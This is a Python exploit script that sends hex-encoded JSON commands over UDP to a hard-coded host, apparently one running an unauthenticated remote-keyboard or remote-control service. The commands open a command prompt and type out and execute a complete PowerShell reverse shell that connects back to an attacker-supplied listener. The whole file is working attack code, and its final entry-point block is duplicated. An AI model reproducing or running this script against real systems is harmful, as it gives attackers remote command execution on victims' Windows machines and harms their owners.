import socket
import time
import argparse
import json

def main():
    parser = argparse.ArgumentParser(description='Send UDP commands and execute reverse shell')
    parser.add_argument('--lhost', required=True, help='Listener IP address')
    parser.add_argument('--lport', required=True, type=int, help='Listener port')
    args = parser.parse_args()

    UDP_IP = "192.168.1.109"
    UDP_PORT = 27000

    # Build PowerShell reverse shell command
    ps_command = (
        f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{args.lhost}',{args.lport});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=iex $d 2>&1;"
        "$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)"
        "}\""
    )

    # Create JSON payload for PowerShell command
    ps_payload = {"Key": ps_command}
    ps_json = json.dumps(ps_payload)
    ps_hex = ps_json.encode('utf-8').hex()

    messages = [
        # Connection messages
        "7b224973436f6e6e656374696e67223a2274727565227d",          # {"IsConnecting":"true"}
        "7b22636f6e6e656374696f6e223a2022616374697665227d",        # {"connection": "active"}
        
        # START command
        "7b2241726561486569676874223a302c22417265615769647468223a302c22436f6d6d616e644e616d65223a225354415254222c2258223a302c2259223a307d",
        
        # Open CMD
        "7b224b6579223a22636d64227d",          # {"Key":"cmd"}
        "7b224b6579223a225c6e227d",            # {"Key":"\\n"} - Enter to open cmd
        
        # Send PowerShell command as hex-encoded JSON
        ps_hex,
        
        # Send Enter to execute command
        "7b224b6579223a225c6e227d"             # {"Key":"\\n"} - Execute
    ]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"[*] Sending setup commands to {UDP_IP}:{UDP_PORT}")
    print(f"[*] PowerShell command length: {len(ps_command)} characters")
    print(f"[*] JSON payload length: {len(ps_json)} characters")
    print(f"[*] Hex payload length: {len(ps_hex)} characters")

    # Send all messages with strategic delays
    for i, hex_msg in enumerate(messages):
        data = bytes.fromhex(hex_msg)
        sock.sendto(data, (UDP_IP, UDP_PORT))
        
        # Add longer delays for critical commands
        if i == 2:  # After START command
            delay = 2
        elif i == 5:  # After PowerShell command
            delay = 3
        else:
            delay = 1
            
        print(f"Sent command {i+1}/{len(messages)}: {data[:50].decode('utf-8', errors='ignore')}...[truncated]")
        time.sleep(delay)
    
    sock.close()
    print("[+] Reverse shell command sequence sent. Check your listener!")

if __name__ == "__main__":
    main()

if __name__ == "__main__":
    main()
